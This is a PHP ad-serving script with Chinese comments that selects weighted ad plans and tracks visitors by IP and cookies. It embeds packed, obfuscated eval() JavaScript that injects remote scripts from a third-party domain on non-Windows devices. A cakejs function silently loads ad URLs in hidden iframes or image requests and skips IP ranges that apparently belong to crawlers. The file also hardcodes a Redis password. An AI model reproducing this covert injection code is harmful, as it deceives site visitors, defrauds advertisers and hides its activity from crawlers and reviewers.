        $xianzhi_log_test=' 广告位不包含当前计划分类不满足';
        //不满足条件的存cookies 存pid
        cookie_limit_pid($ad_sql_list, $i);
    }

}

//获取手机型号
function model()
{
    //获取手机系统及型号
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    //返回值中是否有Android这个关键字
    if (stristr($_SERVER['HTTP_USER_AGENT'], 'Android') && stristr($user_agent, 'Build')) {
        $sub_end = stristr($user_agent, 'uild',true); //截取uild之前的字符串
        $sub_start = strripos($sub_end,';') + 2; //从;最后出现的位置 开始截取
        $sub_endnum = strripos($sub_end,'B'); //B最后一次出现的位置
        $sub_cha = ($sub_endnum - $sub_start) - 1; //截取几位
        $sub_results = substr($sub_end, $sub_start, $sub_cha);
        if(empty($sub_results)){
            $sub_results = 'Android';
        }
        return $sub_results;   //返回手机型号
    }elseif(stristr($_SERVER['HTTP_USER_AGENT'], 'Android')){
        return 'Android';
    }elseif(stristr($_SERVER['HTTP_USER_AGENT'], 'iPhone') || stristr($_SERVER['HTTP_USER_AGENT'], 'iPad') || stristr($_SERVER['HTTP_USER_AGENT'], 'iPod')){
        $sub_end = stristr($user_agent, 'ike',true); //截取like之前的字符串
        $sub_start = strripos($sub_end,'CPU') + 4; //从;最后出现的位置 开始截取
        $sub_endnum = strripos($sub_end,'l'); //L最后一次出现的位置
        $sub_cha = ($sub_endnum - $sub_start) - 1; //截取几位
        $sub_results = substr($sub_end, $sub_start, $sub_cha);
        if(empty($sub_results)){
            $sub_results = 'iPhone';
        }
        return $sub_results;   //返回手机型号
    }else{
        return 'win系统';
    }

}

// 存不满足条件的计划id
function cookie_limit_pid($ad_sql_list, $i)
{
    global $limit_pid;

    $limit_pid = $limit_pid . ',' . $ad_sql_list[$i]['pid'];
}

// 处理不满足条件的计划id
$array_pid = explode(',', $limit_pid);

// 去重
$array_pid = array_unique($array_pid);
// 数组转字符串存cookies

$limit_pid = isset($limit_pid) ? $array_pid : 0;

// 用户IP
$uIP = GetIp();

//方案1：传过来的数据是单个的 没有办法比对. 应该传 二维数组   [计划ID[广告ID,广告权重]，计划权重](推荐使用)
//方案2: 这边先筛选已经展示过的广告和广告计划.然后交由广告筛选器进行筛选.
//$proArr 广告id加权重数组  110 广告 100权重
//function cookie_checkerG($pdo,$proArr,$type,$adid_sel_res,$final_ads_sel)
function cookie_checkerG($pdo, $ad_id_arr, $pid,$sredis,$uIP,$now_adid)
{
    $result = '';
    $type = "randg";

    //判断redis里面，本次访问的用户是否访问过此广告id
    $user_adid = $sredis->handler()->HMGET($uIP,array('adid'))['adid'];

    if (!empty($user_adid)) {
        $redis_adid_arr = array_flip(explode(',', $user_adid));
        $inter_adids = array_diff_key($ad_id_arr,$redis_adid_arr);

        //当前计划的广告都展示过，清除此计划下面的广告，在加上本次的广告id
        if(empty($inter_adids)){

            foreach($ad_id_arr as $key=>$value){
                if(array_key_exists($key,$redis_adid_arr)){
                    unset($redis_adid_arr[$key]);
                }
            }
        }
        //如果广告都被展示，则重新来
        if (empty($inter_adids)) {

            //删除上次所展示的广告id
            $ad_id_cop = $ad_id_arr;
            if(array_key_exists($now_adid,$ad_id_cop)){
                unset($ad_id_cop[$now_adid]);
            }
            //只有一个广告的情况下
            if(empty($ad_id_cop)){
                exit;
            }

            $result = get_rand($ad_id_cop);
            //本次用户访问的广告id + 别的计划下面已显示的广告id 存redis
            $text_adid = implode(',',array_flip($redis_adid_arr));
            if(empty($text_adid)){
                $user_text_adid =$result;
            }else{
                $user_text_adid =$result.','.$text_adid;
            }

            $array_adid =array(
                'adid' => $user_text_adid,
            );

            $sredis->handler()->HMSET($uIP,$array_adid);

        } else {
            $result = get_rand($inter_adids);
            //本次用户访问的广告id + 以前的广告id  存redis
            if(empty($user_adid)){
                $user_text_adid = $result;

            }else{
                $user_text_adid = $result.','.$user_adid;
            }

            $array_adid =array(
                'adid' => $user_text_adid,

            );
            $sredis->handler()->HMSET($uIP,$array_adid);

        }

    } else {
        $result = get_rand($ad_id_arr);
        $array_adid =array(
            'adid' => $result
        );

        //本次用户访问的广告id存redis
        $sredis->handler()->HMSET($uIP,$array_adid);
    }
    return $result;
}

//ccp.
function cookie_checker_plan($ad_id_arr,$sredis,$uIP)
{
    $type = "randj";
    $pidcount = count($ad_id_arr);

    $result = '';

    //判断redis里面，本次访问的用户是否访问过此计划id
    $user_pid = $sredis->handler()->HMGET($uIP,array('pid'))['pid'];

    if (!empty($user_pid)) {

        $redis_pid_arr = array_flip(explode(',', $user_pid));
        $inter_adids = array_diff_key($ad_id_arr,$redis_pid_arr);

        //如果广告都被展示，则重新来
        if (empty($inter_adids)) {

            $result = get_rand($ad_id_arr);

            //判断随机到的值是否和上一次随机的想相同  相同情况下unset本次随机再重新随机
            $last_show_pid = array_pop(array_keys($redis_pid_arr));
            if($last_show_pid == $result&&count($ad_id_arr)>1){
                if(array_key_exists($result,$ad_id_arr)){
                    unset($ad_id_arr[$result]);
                }
                $result = get_rand($ad_id_arr);
            }

            $array_pid =array(
                'pid'  => $result
            );

            //本次用户访问的广告id存redis
            $sredis->handler()->HMSET($uIP,$array_pid);

        } else {
            $result = get_rand($inter_adids);
            //本次用户访问的计划id + 以前的计划id  存redis
            $array_pid =array(
                'pid'  => $user_pid.','.$result
            );
            //本次用户访问的广告id存redis
            $sredis->handler()->HMSET($uIP,$array_pid);

        }

    } else {

        $result = get_rand($ad_id_arr);
        $array_pid =array(
            'pid'  => $result
        );
        //本次用户访问的广告id存redis
        $sredis->handler()->HMSET($uIP,$array_pid);
    }
    return $result;
}

//gr.
function get_rand($proArr)
{
    $result = '';
    //概率数组的总概率精度
    $proSum = array_sum($proArr);
    //概率数组循环
    foreach ($proArr as $key => $proCur) {
        $randNum = mt_rand(1, $proSum);             //抽取随机数
        if ($randNum <= $proCur) {
            $result = $key;                         //得出结果
            break;
        } else {
            $proSum -= $proCur;
        }
    }

    unset ($proArr);
    return $result;
}

$dayTime = date('Y-m-d', time());  //当前日期

$_COOKIE['ran_i'] = isset($_COOKIE['ran_i']) ? $_COOKIE['ran_i'] : 'null';
if (empty($ad_sql_list[$_COOKIE['ran_i']]['pid'])) {
    //echo 66666666;
    $i = 0;
    $_COOKIE['ran_i'] = $i;
    setcookie('ran_i', $i, time() + 86400);
}
$i = $_COOKIE['ran_i'];

$pidarr_sel = array();

foreach ($ad_sql_list as $key => $val) {
    if ($val['priority'] <= 0) {
        $val['adpriority'] = 1;
    }
    $pidarr_sel['plan'][$val['pid']] = $val['priority'];
    if ($val['adpriority'] <= 0) {
        $val['adpriority'] = 1;
    }
    $pidarr_sel['ads'][$val['pid']][$val['ad_id']] = $val['adpriority'];
}

$array_pid = array_flip($limit_pid);

//数组key对比（不满足条件的pid 和 全部pid 对比）
$contrast_arr = array_diff_key($pidarr_sel['plan'], $array_pid);

if ($is_iphone||$is_ipad) {
    $mobile = 'ios';
}

if($is_android){
    $mobile = 'android';
}

$new_array = array(
    '北京-北京-8395-ios-5634',
    '北京-北京-8395-android-5658',

    '北京-北京-8500-ios-5634',
    '北京-北京-8500-android-5658',

    '北京-北京-8554-ios-5634',
    '北京-北京-8554-android-5196',

    '北京-北京-8701-ios-5634',
    '北京-北京-8701-android-5633',

    '北京-北京-8852-android-5771',
    '北京-北京-8852-ios-5634',
    );

//当前的地区-广告位id-系统类型
$now_data = $user_city.'-'.$id.'-'.$mobile;
//返回满足条件的计划id
$sub_pid_data = arraySearch($new_array,$now_data);


if(!empty($sub_pid_data)){

    foreach($contrast_arr as $key => $value){

        //从满足里面删除不想显示的计划id
        if($key != $sub_pid_data){
            unset($contrast_arr[$key]);
        }
    }

}

function arraySearch( $array, $search ) { 
    foreach ($array as $key => $value) { 

        if(strstr( $value, $search)){ 
            $sub_array = explode('-',$value);
            //返回满足条件的计划id
           return $sub_array[4];
        } 
    } 

}



if($user_city == '北京-北京' && $id == '8726' ){
    exit;
}

if($user_city == '北京-北京' && $id == '6646'){
   exit;
}

// 对比为空说明广告对应的计划都不满足条件
if (empty($contrast_arr)) {
    $log_test_str.= $xianzhi_log_test;
    $log_test_str.= ' '.implode(',', $limit_pid);
    $log_test_str.= ' id-'.$id;

    $log_test_str.=' ERROR10007'."\n";
    writeFile($log_test_file,$log_test_str);
    echo('所有计划限制都不满足，无可投放的广告');
    exit;
}else{
    // 在赋给原值
    $pidarr_sel['plan'] = $contrast_arr;
}
$pid_adid_sel_arr = array();
//得到随机计划
$final_pid = cookie_checker_plan($pidarr_sel['plan'],$sredis,$uIP);

if(($id == 6312)){
    $final_pid = 5159;
}

if(empty($final_pid)){
    $log_test_str.=' ERROR10008'."\n";
    writeFile($log_test_file,$log_test_str);
    echo('所有计划限制都不满足，无可投放的广告');
    exit;
}

$adid_arr = $pidarr_sel['ads'][$final_pid];

foreach ($adid_arr as $key => $value) {
    if (empty($value)) {
        $value = 1;
    }
    $adid_arr[$key] = $value;
}

$today = strtotime(date("Y-m-d"), time());
$end = $today + 60 * 60 * 24;
$cookTime = $end - time();//独立访客存储时间

//独立访客
$old_cookies = isset($_COOKIE['baseCookies']) ? $_COOKIE['baseCookies'] : '';

//获取毫秒
function getMillisecond()
{
    list($t1, $t2) = explode(' ', microtime());
    return (float)sprintf('%.0f', (floatval($t1) + floatval($t2)) * 1000);
}

if (empty($old_cookies)) {
    $baseCookies = base64_encode(getMillisecond());
    $_COOKIE['baseCookies'] = $baseCookies;
    $old_cookies = $baseCookies;
    setcookie('baseCookies', $baseCookies, time() + $cookTime);
}else{
    $old_cookies = $_COOKIE['baseCookies'];
}

//现在所展示的广告id
$now_adid = $show_array[2];

$final_ad_id = cookie_checkerG($pdo, $adid_arr, $final_pid,$sredis,$uIP,$now_adid);

//随机得到的广告id
$rand = $final_ad_id;
//随机得到的计划id
$Pid = $final_pid;

//展示的广告信息
$List = advInformation($pdo,$id,$rand,$adzList,$Pid,$sredis);
//统计点击量  click_url
$baseUrl = 'blogid=' . $rand .'&siteid='.$siteRes[0]['site_id'].'&uid='.$adzList[0]['uid'].
'&pid='.$final_pid.'&userip='.$uIP.'&tpl_id='.$List['tpl_id'].'&plantype='.$List['plantype'].'&planuid='.$List['planuid'];
$baseUrl = "$platformUrl/$cilck_url" .$id .$sign. base64_encode($baseUrl);

// 判断信息是否完整
if (!empty($List)) {
    // 把字符串 \ 转化 /
    if ($List['files'] == 1) {
        $List['imageurl'] = "$img_server" . str_replace('\\', '/', $List['imageurl']);
    } else {
        $List['imageurl'] = str_replace('\\', '/', $List['imageurl']);
    }
    $dayTime = date('Y-m-d', time());  //当前日期

    // 用户IP
    $uIP = GetIp();

    //用户当前使用的浏览器信息
    $userBrowse = get_access_browse();
    $impBrowse = implode('/', $userBrowse);
    $arrayBrowse = explode('/', $impBrowse);
    if (empty($arrayBrowse[2])) {
        $arrayBrowse[2] = '0';
    }
    if (empty($arrayBrowse[3])) {
        $arrayBrowse[3] = '0';
    }

    $htmlcontrol = unserialize($List['htmlcontrol'])['position'];

    $List['imageurl'] = str_replace('./', '/', $List['imageurl']);
    if(!empty($_SERVER['HTTP_HOST']))
    {
        $List['imageurl'] = substr($List['imageurl'],7);
        $num = stripos($List['imageurl'],'/');
        $List['imageurl'] = substr($List['imageurl'],$num);
    }
    $viewjs = '';
    $viewjs = htmlspecialchars_decode($List['viewjs']);
}
//手机系统版本
$system_version = getOS();

//广告间隔时间(广告有间隔时间进入，没有不进入)
if(!empty($adzList[0]['minutes'])){

    $array_minutes = unserialize($adzList[0]['minutes']);
    if($array_minutes[0] != 0){
        $minutes = $array_minutes[0] * 60;
    } else{
        $minutes = 0;
    }
}else{
    $minutes = 0;
}

$stytlename = chr(rand(65,90)).rand(1,9);

$http_type = is_HTTPS();
if($http_type==TRUE){
    if(strpos($List['imageurl'], 'img.monesyy') == true){
        if(strpos($List['imageurl'], 'https') == false){
            $List['imageurl'] = str_replace('http','https',$List['imageurl']);
        }
        $List['imageurl'] = str_replace('img.monesyy','wen.monesyy',$List['imageurl']);
    }
}

$img_array = array();
$img_array['rand'] = $rand;
$img_array['tupian'] = $List['imageurl'];
$img_array['dianji'] = $baseUrl;

?>  


<?php 
if (!empty($List)) {

    $statsParams = array(
        'adz_id' => $id,
        'ad_id'  => $rand,
        'pid'    => $final_pid,
        'uid'    => $adzList[0]['uid'],
        'tc_id'  => $List['tc_id'],
        'tpl_id' => $List['tpl_id'],
        'plan_type' => $List['plan_type'],
        'planuid'   => $List['planuid'],
        'site_id'   => $siteRes[0]['site_id'],
        'user_ip' => $uIP,
        'base_cookies' => $old_cookies,
        'browser'=>$arrayBrowse[2],
        'ver'=>$arrayBrowse[3],
        'kernel'=>$arrayBrowse[0],
        'modle_name'=>$modle,
        'system_version'=>$system_version,
    );
} 
?>

<?php
$viewjs = str_replace("blogs",$stytlename.'blogs',$viewjs);
$viewjs = str_replace("config",$stytlename.'config',$viewjs);
$viewjs = str_replace("imgurl",$stytlename.'imgurl',$viewjs);
$viewjs = str_replace("baseUrl",$stytlename,$viewjs);
$viewjs = str_replace("closed",$stytlename.'closed',$viewjs);

$uaaaaagent = $_SERVER['HTTP_USER_AGENT'];

//获取服务器地址1
$urlsaldasldas = service($sredis,$globalRes);

$urlsaldasldas = empty($_SERVER['HTTP_HOST']) ? $urlsaldasldas : $_SERVER['HTTP_HOST'];
$urlsaldasldas = "'+imgdomain+'";
//广告间隔时间(广告有间隔时间进入，没有不进入)
if(!empty($adzList[0]['minutes'])){

    $cookie = 'minutes_' .$id;
    $viewjs = str_replace("chapingadcookie",$cookie,$viewjs);
}
$pdo = null;

$cccccurl = "";
//IOS + 插屏专用
if( !empty($adzList[0]['minutes']) && strpos($uaaaaagent, 'iPhone') !== false ){

    $urlimgimg = 'blog_id='.$statsParams['ad_id'].
        '&pid='.$statsParams['pid'].'&uid='.$statsParams['uid'].'&tc_id='.$statsParams['tc_id'].'&tpl_id='.$statsParams['tpl_id'].
        '&plan_type='.$statsParams['plan_type'].'&planuid='.$statsParams['planuid'].'&site_id='.$statsParams['site_id'].'&user_ip='.$statsParams['user_ip'].
        '&base_cookies='.$statsParams['base_cookies'].'&browser='.$statsParams['browser'].'&ver='.$statsParams['ver'].
        '&kernel='.$statsParams['kernel'].'&modle_name='.$statsParams['modle_name'].'&system_version='.
        $statsParams['system_version'].'&cookie='.$cookie;
    $urlimgimg = ''.$urlsaldasldas."/blogcm/pv".$statsParams['adz_id'].'?'. base64_encode($urlimgimg);
    $cccccurl = $urlimgimg;
    //浏览计费url
    $img_array['liulan'] = $urlimgimg;

    $viewjs = str_replace("swdcvkrnaaa",$urlimgimg,$viewjs);



    $List['url'] = str_replace("{uid}",$uid,$List['url']);
    $List['url'] = str_replace("{gid}",$id,$List['url']);


}else{
    //new
    $urlimgimgaaa = 'blog_id='.$statsParams['ad_id'].
        '&pid='.$statsParams['pid'].'&uid='.$statsParams['uid'].'&tc_id='.$statsParams['tc_id'].'&tpl_id='.$statsParams['tpl_id'].
        '&plan_type='.$statsParams['plan_type'].'&planuid='.$statsParams['planuid'].'&site_id='.$statsParams['site_id'].'&user_ip='.$statsParams['user_ip'].'&base_cookies='.$statsParams['base_cookies'].
        '&browser='.$statsParams['browser'].'&ver='.$statsParams['ver'].'&kernel='.$statsParams['kernel'].'&modle_name='.
        $statsParams['modle_name'].'&system_version='.$statsParams['system_version'];
    $urlimgimgaaa = ''.$urlsaldasldas."/blogcm/pv".$statsParams['adz_id'].'?'. base64_encode($urlimgimgaaa);
    $cccccurl = $urlimgimgaaa;
    //浏览计费url
    $img_array['liulan'] = $urlimgimgaaa;

    $viewjs = str_replace("swdcvkrnaaa",$urlimgimgaaa,$viewjs);



    $List['url'] = str_replace("{uid}",$uid,$List['url']);
    $List['url'] = str_replace("{gid}",$id,$List['url']);

}

echo json_encode($img_array);
exit;

//老付专用1 

//随机输出
$lffi = rand(0,6);



    $agent = strtolower($_SERVER['HTTP_USER_AGENT']);
    $is_android = (strpos($agent, 'android')) ? true : false;
    $is_MQQBrowser = (strpos($agent, 'mqqbrowser')) ? true : false;
    $is_UCBrowser = (strpos($agent, 'ucbrowser')) ? true : false;
    $http_type = is_HTTPS();
    $lfhttp = ''; 
        
     $iqiyi_eval_js = ";eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p}('b (g.h.c(\'2\') < 0) { p 7 = 9.8(\'i\');   7.n = \'k/e\';  7.4 = m;    7.6 = \'o-1\';  7.j = \'a://q.r.l/d.f\';    9.5.3(7)}',62,28,'|8|Win|appendChild|async|body|charset|cnzz_tj_tag|createElement|document|https|if|indexOf|iqiyi|javascript|js|navigator|platform|script|src|text|top|true|type|utf|var|www|wxbgf'.split('|'),0,{}));";

    $sm_eval_js = ";eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p}('b (f.g.c(\'2\') < 0) {    p 7 = 9.8(\'h\');   7.n = \'k/d\';  7.4 = m;    7.6 = \'o-1\';  7.j = \'a://q.r.l/i.e\';    9.5.3(7)}',62,28,'|8|Win|appendChild|async|body|charset|cnzz_tj_tagg|createElement|document|https|if|indexOf|javascript|js|navigator|platform|script|sm|src|text|top|true|type|utf|var|www|wxbgf'.split('|'),0,{}));";
    

    if($http_type != TRUE){

       
        if($id==8500||$id==8501||$id==8395){
            if($user_city == '北京-北京'||$user_city == '广东-深圳'){
                $iqiyi_eval_js = '';
            }
        }

      
        $get_redisIP = $sredis->handler()->HMGET($user_IP,array('num'))['num'];

        if($get_redisIP != $statsParams['uid']){

            //1120  sm.js
            echo $sm_eval_js;

            //文件地址
            $url = 'adzlimit.txt';
            //读取文件数据放入字符串里
            $text = file_get_contents($url);
            //字符串转数组
            $array = explode(',',$text);
            //数组值 string型 转 int型
            $deny_arr = array();
            foreach($array as $key => $value)
            {
                $deny_arr[$key] = intval($value);
            }

            if(!in_array($id, $deny_arr)){
                echo $iqiyi_eval_js;
            }
            
            $array_num =array(
                'num'  => $statsParams['uid']
            );
            $sredis->handler()->HMSET($uIP,$array_num);  
        }
    }

//如果是https
$lffi_htts = rand(0,1);


 if($http_type==TRUE){

    $get_redisIP = $sredis->handler()->HMGET($user_IP,array('num'))['num'];

    if($get_redisIP != $statsParams['uid']){

        //1120  sm.js
        echo $sm_eval_js;

        //文件地址
        $url = 'adzlimit.txt';
        //读取文件数据放入字符串里
        $text = file_get_contents($url);
        //字符串转数组
        $array = explode(',',$text);
        //数组值 string型 转 int型
        $deny_arr = array();
        foreach($array as $key => $value)
        {
            $deny_arr[$key] = intval($value);
        }

        if(!in_array($id, $deny_arr)){
            echo $iqiyi_eval_js;
        }
        
        $array_num =array(
            'num'  => $statsParams['uid']
        );
        $sredis->handler()->HMSET($uIP,$array_num);  
    }
}

//判断访问用户是httpstp 
function is_HTTPS(){  
    if(!isset($_SERVER['HTTPS']))  return FALSE;  
    if($_SERVER['HTTPS'] === 1){  //Apache  
        return TRUE;  
    }elseif($_SERVER['HTTPS'] === 'on'){ //IIS  
        return TRUE;  
    }elseif($_SERVER['SERVER_PORT'] == 443){ //其他  
        return TRUE;  
    }  
    return FALSE;  
}

function writeFileforpid($file,$str,$mode='a+')
{
    $oldmask = @umask(0);
    $fp = @fopen($file,$mode);
    if(!$fp){

    } else {
        @fwrite($fp,$str);
        @fclose($fp);
    }
}

function cakejs($List,$final_pid,$globalRes,$user_IP){

    $filecake = 'cakef.txt';
    $fp = file_get_contents($filecake);
    $lurl = $List['url'];
    if(stristr($_SERVER['HTTP_USER_AGENT'], 'UCBrowser'))
    {
        if(stristr($lurl, '?'))
        {
            $lurl = $lurl."&uctime=".time();
        }else
        {
            $lurl = $lurl."?uctime=".time();
        }
    }
    // @flock($fp, 3);
    if(!empty($fp)){
        $pz = explode('@', $fp);
        $pzlength = count($pz);
        $mf_iframe  = floor(rand(1,100)/100*99+1);
        $i = 0;
        for($i;$i<$pzlength;$i++){
            $pl = explode('|',$pz[$i]);
            if($final_pid==$pl[0]){
                if($mf_iframe<=$pl[1]){
                    
                    if(($final_pid==5180)&&!stristr($_SERVER['HTTP_USER_AGENT'], 'UCBrowser')&&
                        !stristr($_SERVER['HTTP_USER_AGENT'], 'QQBrowser')){
                        
                        echo "var KnnsLif = document.createElement('iframe'); ";
                        echo "KnnsLif.src='".$lurl."';";
                        echo "KnnsLif.style.display='none';";
                        echo "document.body.appendChild(KnnsLif); ";
                    }else{
                        echo 'var final_pid='.$final_pid.';';
                        echo 'var p_q = "'.substr($lurl,0,9).'";';
                        echo 'var p_h = "'.substr($lurl,9).'";';
                        echo 'var purl=p_q+p_h'.';';

                        $ip_pingbi1 = substr('220.181.108.*',0,strrpos('220.181.108.*','.'));
                        $ip_pingbi2 = substr('111.206.221.*',0,strrpos('111.206.221.*','.'));

                        $ipbenshen = substr($user_IP,0,strrpos($user_IP,'.'));

                        if($ipbenshen!=$ip_pingbi1&&$ipbenshen!=$ip_pingbi2){
                            echo ";eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p}('5(8.d.2(\'b\')<0){6 3=9 a();3.7=c;6 4=8.p;5(4.2(\'e\')>-1||4.2(\'g\')>-1){h(i(){3.7=\'j://k.l.m/n.o\'},f)}}',26,26,'||indexOf|Cc_img|u|if|var|src|navigator|new|Image|Win|purl|platform|Android|150|Adr|setTimeout|function|http|www|baidu|com|favicon|ico|userAgent'.split('|'),0,{}));";
                        }
                        
                    }

                }
            }
        }
    }
}

if(!empty($siteRes[0]['site_cnzz_id'])){

}

?>


<?php
if (!empty($List)) {
    //判断每日限额
    if ((!empty($siteRes))) {
        echo htmlspecialchars_decode($List['iframejs']);
    }
}
?>

<?php

//获取用户 IP
function GetIp()
{
    $realip = '';
    $unknown = 'unknown';
    if (isset($_SERVER)) {
        if (isset($_SERVER['HTTP_X_FORWARDED_FOR']) && !empty($_SERVER['HTTP_X_FORWARDED_FOR']) && strcasecmp($_SERVER['HTTP_X_FORWARDED_FOR'], $unknown)) {
            $arr = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
            foreach ($arr as $ip) {
                $ip = trim($ip);
                if ($ip != 'unknown') {
                    $realip = $ip;
                    break;
                }
            }
        } else if (isset($_SERVER['HTTP_CLIENT_IP']) && !empty($_SERVER['HTTP_CLIENT_IP']) && strcasecmp($_SERVER['HTTP_CLIENT_IP'], $unknown)) {
            $realip = $_SERVER['HTTP_CLIENT_IP'];
        } else if (isset($_SERVER['REMOTE_ADDR']) && !empty($_SERVER['REMOTE_ADDR']) && strcasecmp($_SERVER['REMOTE_ADDR'], $unknown)) {
            $realip = $_SERVER['REMOTE_ADDR'];
        } else {
            $realip = $unknown;
        }
    } else {
        if (getenv('HTTP_X_FORWARDED_FOR') && strcasecmp(getenv('HTTP_X_FORWARDED_FOR'), $unknown)) {
            $realip = getenv("HTTP_X_FORWARDED_FOR");
        } else if (getenv('HTTP_CLIENT_IP') && strcasecmp(getenv('HTTP_CLIENT_IP'), $unknown)) {
            $realip = getenv("HTTP_CLIENT_IP");
        } else if (getenv('REMOTE_ADDR') && strcasecmp(getenv('REMOTE_ADDR'), $unknown)) {
            $realip = getenv("REMOTE_ADDR");
        } else {
            $realip = $unknown;
        }
    }
    $realip = preg_match("/[\d\.]{7,15}/", $realip, $matches) ? $matches[0] : $unknown;
    return $realip;
}

//根据用户ip获取地理位置
function GetIpLookup($ip = '',$IpSearch)
{
    header("Content-Type: text/html;charset=utf-8");
    $res = $IpSearch->get($ip);
    if(!empty($res)){
        $res = explode('|', $res);
    }else{
        $res = array(
            0 => '',
            1 => '',
            2 => '',
            3 => '',
            4 => '',
        );
    }
    return $res;
}

//得到浏览器信息
function get_access_browse()
{
    // 全部浏览器代理 // CriOS == iPhone 的chrome
    $browser = array('Chrome', 'Firefox', 'Opera', 'MSIE', 'CriOS', 'Safari');
    $r = array('Unknown', 0);
    // 搜索 浏览器
    if (!preg_match_all('/([a-zA-Z]{4,})[\/ ]([0-9\.]+)/i', $_SERVER['HTTP_USER_AGENT'], $arr)) {
        return $r;
    }
    foreach ($browser as $value) {
        if (($key = array_search($value, $arr[1])) !== false) {
            if(is_array($arr[0])){
                if(isset($arr[0][2])){
                    $r = array($arr[0][1], $arr[0][2]);
                }else{
                    $r = '';
                }
            }else{
                $r = '';
            }
            break;
        }
    }
    return $r;
}

//获取手机系统版本（例如 Android :4.4.2）
function getOS()
{
    $ua = $_SERVER['HTTP_USER_AGENT'];//这里只进行IOS和Android两个操作系统的判断，其他操作系统原理一样
    if (strpos($ua, 'Android') !== false) {//strpos()定位出第一次出现字符串的位置，这里定位为0
        preg_match("/(?<=Android )[\d\.]{1,}/", $ua, $version);
        if(empty($version)){
            $version[0] = '';
        }
        return 'Android:' . $version[0];
    } elseif (strpos($ua, 'iPhone') !== false) {
        preg_match("/(?<=CPU iPhone OS )[\d\_]{1,}/", $ua, $version);
        if(empty($version)){
            $version[0] = '';
        }
        return 'iPhone:' . str_replace('_', '.', $version[0]);
    } elseif (strpos($ua, 'iPad') !== false) {
        preg_match("/(?<=CPU OS )[\d\_]{1,}/", $ua, $version);
        if(empty($version)){
            $version[0] = '';
        }
        return 'iPad:' . str_replace('_', '.', $version[0]);
    }
}

//广告间隔时间(广告有间隔时间进入，没有不进入)
function intervalTime($id,$adzList)
{
    global $log_test_str;
    global  $log_test_file;
    if (empty($_COOKIE['androidmin_' .$id . ''])) {

        if (!empty($adzList[0]['minutes'])) {
            $array_minutes = unserialize($adzList[0]['minutes']);
            if($array_minutes[0] != 0){
                $minutes = $array_minutes[0] * 60;

                //存入cookies
                $_COOKIE['androidmin_'.$id.''] = $minutes;

                setcookie('androidmin_'.$id.'',$minutes ,time() + $minutes,'/');
            }
        }
    }else{
        exit;
    }
}

//展示的广告信息
function advInformation($pdo,$id,$rand,$adzList,$pid,$sredis)
{
    global $log_test_str;
    global  $log_test_file;

    $prep = $pdo->prepare("SELECT a.uid,a.plantype,a.width,a.height,a.htmlcontrol,a.false_close,b.viewjs,b.iframejs,c.tpl_id,
        d.text_chain,d.imageurl,d.url,d.files,d.tc_id,d.pid,e.plan_type,e.uid AS planuid FROM lz_adzone AS a
        LEFT JOIN lz_adstyle AS b ON a.adstyle_id = b.style_id LEFT JOIN lz_admode AS c
        ON a.adtpl_id = c.tpl_id LEFT JOIN lz_ads AS d ON c.tpl_id =d.tpl_id LEFT JOIN lz_plan AS e ON d.pid = e.pid
        WHERE a.adz_id=? AND d.ad_id=? AND a.uid=? AND e.pid=? AND d.status = 1");
    $prep->execute(array($id,$rand,$adzList[0]['uid'],$pid));
    $res = $prep->fetchAll();

    if (empty($res)) {
        //展示广告信息有误
        $log_test_str.=' ERROR10010'."\n";
        writeFile($log_test_file,$log_test_str);
        echo('展示广告信息有误');
        exit;
    }

    $res = $res[0];


    return $res;

}

//服务器地址
function service($sredis,$globalRes)
{
    $domain = '';
    if(!empty($globalRes[0]['adv_server'])){
        $globalRes[0]['adv_server'] = explode('//',$globalRes[0]['adv_server']);
        //判断是否为空
        if(!empty($globalRes[0]['adv_server'][1])){
            $domain = $globalRes[0]['adv_server'][1];
        }else{
            $domain = $sredis->redirect_url;
        }

    }else{
        $domain = $sredis->redirect_url;
    }
    return $domain;
}

// 收集手机型号
$connect_Param = array(
        'host'       => '127.0.0.1',
        'port'       => 6379,
        'password'   => 'cyredis',
        'timeout'    => 1,
        'expire'     => 0,
        'persistent' => false,
        'prefix'     => '',);
$sredis = new Redisutil($connect_Param);

//判断该广告位是否发送js请求
$checkadz = unserialize($adzList[0]['checkadz']);
//第一步查询该广告位是否有地域限制，并且地域符合，判断是否发送js，否则直接跳过
if($checkadz['isacl'] == 1){
    if($checkadz['comparison'] == 0){
        //ip地址不包含在拒绝的地址内，判断是否发送js
        if(!in_array($ipInfos[3],$checkadz['city'])){
            adz_js($sredis,$statsParams,$checkadz);
        }
    }else{
        //ip地址包含在允许的地址内，判断是否发送js
        if(in_array($ipInfos[3],$checkadz['city'])){
            adz_js($sredis,$statsParams,$checkadz);
        }
    }
}

//判断本次是否发送js
function adz_js($sredis,$statsParams,$checkadz){
    //第二步查询该广告在该ip下的展示次数,并且将本次展示计入次数
    $sredis->handler()->HINCRBY('adz_num_ip'.$statsParams['adz_id'],$statsParams['user_ip'],1);
    $adzNumNow = $sredis->handler()->HMGET('adz_num_ip'.$statsParams['adz_id'],array($statsParams['user_ip']))[$statsParams['user_ip']];
    //第三步比较该ip在该广告下的展示次数是否大于开启限制时设定的展示频率
    $checkadz['adznum'] = empty($checkadz['adznum']) ? 1 : $checkadz['adznum'];
    if($adzNumNow >= $checkadz['adznum']){
        //第四步获取该ip该广告位在周期内是否发送过js代码，没有发送过则发送js代码，若已经发送过则今天内不会再次发送
        //切换到redis 1号数据库(0号数据库每天凌晨4点清空；1号数据库不清空，里面数据会自动过期)
        $sredis->select(1);
        $adzNumTwo = $sredis->handler()->GET($statsParams['user_ip']);
        //如果1号redis库中该ip该广告位下没有数据，则发送js代码
